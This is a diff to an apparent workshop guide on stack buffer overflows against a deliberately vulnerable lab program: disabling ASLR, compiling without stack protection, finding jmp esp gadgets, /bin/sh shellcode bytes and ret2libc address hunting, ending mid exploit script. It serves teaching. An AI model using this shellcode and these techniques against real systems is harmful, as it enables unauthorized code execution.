@@ -5,6 +5,7 @@
 To get started
 	You will need the files: segment_mem.c, wisdom.c, runescape.sh, pat_gen.py, pat_ind.py
 		git clone https://github.com/parkergarrison/overflow
+		cd overflow
 
 	Download and install gdb-peda to execute some of the gdb commands such as checksec:
 		git clone https://github.com/longld/peda.git ~/peda
@@ -15,10 +16,10 @@ To get started
 
 Memory and the Stack
 	Ensure ASLR is off
-		echo 0 > /proc/sys/kernel/randomize_va_space
+		echo 0 >| /proc/sys/kernel/randomize_va_space
 		
-		Alternative: Turn off ASLR for just one program:
-			UNTESTED: setarch $(uname -m) -R /root/re/wisdom.out
+		Alternative: Turn off ASLR and run just one program:
+			setarch $(uname -m) -R $(pwd)/filename.out # replace with actual full path to file
 	
 	Compile segment_mem.c
 		gcc segment_mem.c -o segment_mem
@@ -47,7 +48,7 @@ Memory and the Stack
 			Which addresses changed?
 			
 		Turn on ASLR and try again
-			echo 1 >| /proc/sys/kernel/randomize_va_space
+			echo 1 >| /proc/sys/kernel/randomize_va_space # note the space after '1'!
 		
 		Turn off ASLR and try again
 			echo 0 >| /proc/sys/kernel/randomize_va_space
@@ -110,7 +111,9 @@ Exploit Mitigations and Bypasses
 			gcc wisdom-basic.c -g -fno-stack-protector -z execstack -o wisdom_e2.out
 		
 		Find useful ESP gadgets
-			gdb-peda> jmpcall
+			gdb-peda$ jmpcall -r esp
+			gdb-peda$ jmpcall
+			
 		
 		/bin/sh Shellcode from exploit-db in escaped format
 			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
@@ -126,18 +129,19 @@ Exploit Mitigations and Bypasses
 	
 	Exercise 3: Bypass NX with ret2libc
 		
-		Find address of "/bin/bash" string
-			git clone https://github.com/JonathanSalwan/ROPgadget.git
-			python ./ROPgadget/ROPgadget.py --binary ~/binexp/wisdom.out --string "/bin/bash"
-				Strings information
-				============================================================
-				0x08048a20 : /bin/bash
+		Find address of "/bin/bash" string compiled into program
+			Automatic using tool
+				git clone https://github.com/JonathanSalwan/ROPgadget.git
+				python ./ROPgadget/ROPgadget.py --binary ~/binexp/wisdom.out --string "/bin/bash"
+					Strings information
+					============================================================
+					0x08048a20 : /bin/bash
 		
-		Alternative
-			gdb> print wisdoms[1]
-				$1 = 0x8048a08 "A great shell to use is /bin/bash"
-			gdb> print wisdoms[1]+24
-				$2 = 0x8048a20 "/bin/bash"
+			Alternative
+				gdb> print wisdoms[1]
+					$1 = 0x8048a08 "A great shell to use is /bin/bash"
+				gdb> print wisdoms[1]+24
+					$2 = 0x8048a20 "/bin/bash"
 			
 		Examine memory location as a string
 			gdb-peda$ x/s 0x8048a20
@@ -145,17 +149,22 @@ Exploit Mitigations and Bypasses
 			
 		
 		Find addresses of functions
+			All functions matching regular expression "system@plt":
+
+			Non-debugging symbols:
+			0x08048570  system@plt
+
 			gdb-peda$ p system
 				$1 = {<text variable, no debug info>} 0xb7e503e0 <system>
 			gdb-peda$ p exit
 				$2 = {<text variable, no debug info>} 0xb7e431b0 <exit>
 				
 		Recompile wisdom.c with NX and no stack canaries
-			gcc wisdom.c -g -o wisdom.out-nx -fno-stack-protector
+			gcc wisdom.c -g -fno-stack-protector -o wisdom_e3.out
 			chmod +x runescape.sh
 			./runescape.sh wisdom.out-nx
 		
-		Print escaped NX bypass exploit code
+		Print escaped NX bypass exploit code (file: exploit_e3_plt.py)
 			Python file:
 				addr_system_esc = r"\xe0\x03\xe5\xb7"
 				addr_exit_esc = r"\xb0\x31\xe4\xb7"
